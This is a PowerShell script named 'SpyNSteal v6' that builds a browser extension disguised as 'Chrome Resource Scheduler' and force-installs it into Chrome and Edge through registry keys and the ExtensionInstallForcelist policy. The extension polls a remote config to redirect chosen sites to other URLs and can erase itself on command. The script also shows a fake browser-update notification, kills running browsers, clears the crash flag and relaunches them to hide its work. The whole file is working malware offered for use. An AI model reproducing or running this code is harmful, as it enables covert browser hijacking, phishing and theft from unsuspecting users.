# SpyNSteal v6 - Chrome-packed CRX + dual install (registry + policy)

$MANIFEST_TEMPLATE = @'
{
  "manifest_version": 3,
  "name": "Chrome Resource Scheduler",
  "version": "1.0",
  "key": "%%KEY_PLACEHOLDER%%",
  "description": "Manages internal resource scheduling and prioritization.",
  "permissions": ["declarativeNetRequest"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "sw.js"
  }
}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
  } catch (_) {}
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  pull();
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
'@

$UPDATE_URL = 'https://raw.githubusercontent.com/Intel-Boss/t/main/update.xml'

# Safe byte-array concatenation for PowerShell 5.1
function BA {
    $ms = New-Object IO.MemoryStream
    foreach ($a in $args) {
        if ($a -is [byte]) { $ms.WriteByte($a) }
        elseif ($a -ne $null) {
            $bytes = [byte[]]$a
            $ms.Write($bytes, 0, $bytes.Length)
        }
    }
    $r = $ms.ToArray()
    $ms.Dispose()
    return ,$r
}

function DerTLV([byte]$tag, [byte[]]$value) {
    $len = $value.Length
    if ($len -lt 128) {
        return ,(BA ([byte[]]@($tag, [byte]$len)) $value)
    } elseif ($len -lt 256) {
        return ,(BA ([byte[]]@($tag, 0x81, [byte]$len)) $value)
    } else {
        return ,(BA ([byte[]]@($tag, 0x82, [byte]($len -shr 8), [byte]($len -band 0xFF))) $value)
    }
}

function DerInteger([byte[]]$data) {
    if ($data[0] -ge 0x80) { $data = BA ([byte[]]@(0)) $data }
    return ,(DerTLV 0x02 $data)
}

function Build-SpkiDer([byte[]]$modulus, [byte[]]$exponent) {
    $modDer = DerInteger $modulus
    $expDer = DerInteger $exponent
    $rsaPub = DerTLV 0x30 (BA $modDer $expDer)
    $bitStr = DerTLV 0x03 (BA ([byte[]]@(0)) $rsaPub)
    $oid = [byte[]]@(0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x01)
    $algId = DerTLV 0x30 (BA $oid ([byte[]]@(0x05,0x00)))
    return ,(DerTLV 0x30 (BA $algId $bitStr))
}

function Find-Browser([string]$name) {
    $info = @{ Name = $name; Found = $false; Running = $false }
    switch ($name) {
        "chrome" {
            $info.UserData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
            $info.Proc = "chrome"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
            $info.ExtRegBase = "SOFTWARE\Google\Chrome\Extensions"
            $info.PolicyBase = "SOFTWARE\Policies\Google\Chrome"
            $info.AppDirs = @(
                "$env:ProgramFiles\Google\Chrome\Application",
                "${env:ProgramFiles(x86)}\Google\Chrome\Application",
                "$env:LOCALAPPDATA\Google\Chrome\Application"
            )
            $info.NotifTitle = "Google Chrome"
            $info.NotifText = "An update has been downloaded. Restarting to apply changes."
        }
        "edge" {
            $info.UserData = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
            $info.Proc = "msedge"
            $info.RegKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe"
            $info.ExtRegBase = "SOFTWARE\Microsoft\Edge\Extensions"
            $info.PolicyBase = "SOFTWARE\Policies\Microsoft\Edge"
            $info.AppDirs = @(
                "${env:ProgramFiles(x86)}\Microsoft\Edge\Application",
                "$env:ProgramFiles\Microsoft\Edge\Application",
                "$env:LOCALAPPDATA\Microsoft\Edge\Application"
            )
            $info.NotifTitle = "Microsoft Edge"
            $info.NotifText = "An update has been installed. Edge will restart to apply it."
        }
    }
    if (-not (Test-Path $info.UserData)) { return $info }
    $info.Found = $true
    $info.Running = [bool](Get-Process $info.Proc -EA SilentlyContinue)
    try { $info.ExePath = (Get-ItemProperty $info.RegKey -EA Stop).'(default)' } catch {}
    if (-not $info.ExePath -or -not (Test-Path $info.ExePath)) {
        foreach ($d in $info.AppDirs) {
            $c = if ($name -eq "chrome") { Join-Path $d "chrome.exe" } else { Join-Path $d "msedge.exe" }
            if (Test-Path $c) { $info.ExePath = $c; break }
        }
    }
    return $info
}

function Patch-LocalState($userDataDir) {
    $lsPath = Join-Path $userDataDir "Local State"
    if (-not (Test-Path $lsPath)) { return }
    try {
        $ls = [IO.File]::ReadAllText($lsPath) | ConvertFrom-Json
        if ($ls.PSObject.Properties["profile"]) {
            if ($ls.profile.PSObject.Properties["exited_cleanly"]) { $ls.profile.exited_cleanly = $true }
            if ($ls.profile.PSObject.Properties["exit_type"]) { $ls.profile.exit_type = "Normal" }
        }
        [IO.File]::WriteAllText($lsPath, ($ls | ConvertTo-Json -Depth 50 -Compress), [Text.Encoding]::UTF8)
    } catch {}
}

function Show-UpdateNotif($browser) {
    try {
        Add-Type -AssemblyName System.Windows.Forms -EA Stop
        Add-Type -AssemblyName System.Drawing -EA Stop
        $n = New-Object Windows.Forms.NotifyIcon
        if ($browser.ExePath -and (Test-Path $browser.ExePath)) {
            $n.Icon = [Drawing.Icon]::ExtractAssociatedIcon($browser.ExePath)
        } else { $n.Icon = [Drawing.SystemIcons]::Information }
        $n.BalloonTipTitle = $browser.NotifTitle
        $n.BalloonTipText = $browser.NotifText
        $n.Visible = $true
        $n.ShowBalloonTip(5000)
        Start-Sleep 5
        $n.Visible = $false; $n.Dispose()
    } catch {}
}

# ============================================================================
$LOG = Join-Path $env:APPDATA "~diag.log"
function Log([string]$msg) { $ts = Get-Date -Format 'HH:mm:ss'; Add-Content $LOG "$ts  $msg" }
Log "=== SpyNSteal v6 ==="

$baseDir = Join-Path $env:APPDATA "CRSched"
$extDir = Join-Path $baseDir "src"
$pemPath = Join-Path $baseDir "k.pem"
New-Item -Path $extDir -ItemType Directory -Force | Out-Null

# Clean old HKCU registry entries from previous runs
foreach ($regBase in @("SOFTWARE\Google\Chrome\Extensions","SOFTWARE\Microsoft\Edge\Extensions")) {
    try {
        $hk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regBase, $false)
        if ($hk) {
            foreach ($sub in $hk.GetSubKeyNames()) {
                $sk = $hk.OpenSubKey($sub, $false)
                if ($sk) {
                    $v = $sk.GetValue("path")
                    $sk.Close()
                    if ($v -and "$v" -like "*CRSched*") {
                        [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regBase, $true).DeleteSubKeyTree($sub)
                        Log "Cleaned old reg: $regBase\$sub"
                    }
                }
            }
            $hk.Close()
        }
    } catch {}
}

# Find Chrome for --pack-extension
$browsers = @()
$chromeExe = $null
foreach ($name in @("chrome", "edge")) {
    $b = Find-Browser $name
    Log "Browser '$name': Found=$($b.Found) Running=$($b.Running) Exe=$($b.ExePath)"
    if ($b.Found) { $browsers += $b }
    if ($name -eq "chrome" -and $b.ExePath -and (Test-Path $b.ExePath)) { $chromeExe = $b.ExePath }
}
if (-not $chromeExe) {
    foreach ($b in $browsers) {
        if ($b.ExePath -and (Test-Path $b.ExePath)) { $chromeExe = $b.ExePath; break }
    }
}
if ($browsers.Count -eq 0) { Log "No browsers"; exit }

$wasRunning = @()
foreach ($b in $browsers) { if ($b.Running) { $wasRunning += $b } }

# Generate or reuse PEM key
if (-not (Test-Path $pemPath)) {
    $rsa = New-Object Security.Cryptography.RSACryptoServiceProvider(2048)
    $p = $rsa.ExportParameters($true)
    $pkcs8 = $rsa.ExportCspBlob($true)
    $b64 = [Convert]::ToBase64String($pkcs8, [Base64FormattingOptions]::InsertLineBreaks)
    [IO.File]::WriteAllText($pemPath, "-----BEGIN RSA PRIVATE KEY-----`n$b64`n-----END RSA PRIVATE KEY-----`n")
    $spkiDer = Build-SpkiDer $p.Modulus $p.Exponent
    $rsa.Dispose()
    Log "Generated new PEM key"
} else {
    $pemText = [IO.File]::ReadAllText($pemPath)
    $b64 = ($pemText -replace '-----[^-]+-----','').Trim()
    $blob = [Convert]::FromBase64String($b64)
    $rsa = New-Object Security.Cryptography.RSACryptoServiceProvider
    $rsa.ImportCspBlob($blob)
    $p = $rsa.ExportParameters($false)
    $spkiDer = Build-SpkiDer $p.Modulus $p.Exponent
    $rsa.Dispose()
    Log "Loaded existing PEM key"
}

$pubKeyB64 = [Convert]::ToBase64String($spkiDer)
$sha = [Security.Cryptography.SHA256]::Create()
$hash = $sha.ComputeHash($spkiDer)
$sha.Dispose()
$extId = ""
for ($i = 0; $i -lt 16; $i++) {
    $extId += [char]([int][char]'a' + ($hash[$i] -shr 4))
    $extId += [char]([int][char]'a' + ($hash[$i] -band 0x0F))
}
Log "Extension ID: $extId"

# Write extension source files (manifest gets the public key)
$manifest = $MANIFEST_TEMPLATE.Replace('%%KEY_PLACEHOLDER%%', $pubKeyB64)
[IO.File]::WriteAllText((Join-Path $extDir "manifest.json"), $manifest, [Text.Encoding]::UTF8)
[IO.File]::WriteAllText((Join-Path $extDir "sw.js"), $SW_JS, [Text.Encoding]::UTF8)
Log "Extension source written"

# Use Chrome to pack the extension into a CRX
$crxOutput = Join-Path $baseDir "src.crx"
$pemOutput = Join-Path $baseDir "src.pem"
if (Test-Path $crxOutput) { Remove-Item $crxOutput -Force }
if (Test-Path $pemOutput) { Remove-Item $pemOutput -Force }

Log "Packing CRX with Chrome..."
$packArgs = @("--pack-extension=`"$extDir`"", "--pack-extension-key=`"$pemPath`"", "--no-message-box")
try {
    $proc = Start-Process -FilePath $chromeExe -ArgumentList $packArgs -PassThru -NoNewWindow
    $proc.WaitForExit(15000)
    if (-not $proc.HasExited) { $proc.Kill() }
    Log "Pack exit code: $($proc.ExitCode)"
} catch {
    Log "Pack error: $_"
}

$crxPath = Join-Path $baseDir "extension.crx"
if (Test-Path $crxOutput) {
    Move-Item $crxOutput $crxPath -Force
    Log "CRX created by Chrome: $crxPath ($((Get-Item $crxPath).Length) bytes)"
} else {
    Log "Chrome pack failed - CRX not found at $crxOutput"
}

if (Test-Path $pemOutput) { Remove-Item $pemOutput -Force }

# Show notification + kill browsers
if ($wasRunning.Count -gt 0) {
    Show-UpdateNotif $wasRunning[0]
    foreach ($b in $wasRunning) {
        try { Stop-Process -Name $b.Proc -Force -EA SilentlyContinue } catch {}
    }
    Start-Sleep 2
    foreach ($b in $wasRunning) {
        for ($w = 0; $w -lt 15; $w++) {
            if (-not (Get-Process $b.Proc -EA SilentlyContinue)) { break }
            try { Stop-Process -Name $b.Proc -Force -EA SilentlyContinue } catch {}
            Start-Sleep 1
        }
        Log "$($b.Proc) dead: $(-not [bool](Get-Process $b.Proc -EA SilentlyContinue))"
    }
}

foreach ($b in $wasRunning) { Patch-LocalState $b.UserData }

# INSTALL METHOD 1: HKCU registry (external extension)
if (Test-Path $crxPath) {
    foreach ($b in $browsers) {
        try {
            $hk = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("$($b.ExtRegBase)\$extId")
            $hk.SetValue("path", $crxPath, [Microsoft.Win32.RegistryValueKind]::String)
            $hk.SetValue("version", "1.0", [Microsoft.Win32.RegistryValueKind]::String)
            $hk.Close()
            Log "Registry set: $($b.ExtRegBase)\$extId"
        } catch {
            Log "Registry error ($($b.Name)): $_"
        }
    }
}

# INSTALL METHOD 2: ExtensionInstallForcelist policy
$policyValue = "$extId;$UPDATE_URL"
foreach ($b in $browsers) {
    try {
        $pKey = [Microsoft.Win32.Registry]::CurrentUser.CreateSubKey("$($b.PolicyBase)\ExtensionInstallForcelist")
        $existing = $pKey.GetValueNames()
        $nextIdx = 1
        foreach ($vn in $existing) {
            $val = $pKey.GetValue($vn)
            if ("$val" -like "$extId;*") {
                $pKey.DeleteValue($vn)
            }
            $num = 0
            if ([int]::TryParse($vn, [ref]$num) -and $num -ge $nextIdx) { $nextIdx = $num + 1 }
        }
        $pKey.SetValue("$nextIdx", $policyValue, [Microsoft.Win32.RegistryValueKind]::String)
        $pKey.Close()
        Log "Policy set: $($b.PolicyBase)\ExtensionInstallForcelist\$nextIdx = $policyValue"
    } catch {
        Log "Policy error ($($b.Name)): $_"
    }
}

# Relaunch
Start-Sleep 1
foreach ($b in $wasRunning) {
    if ($b.ExePath -and (Test-Path $b.ExePath)) {
        Log "Launching: $($b.ExePath)"
        try { Start-Process -FilePath $b.ExePath -ArgumentList "--restore-last-session" } catch {}
    }
}

Log "=== Done ==="
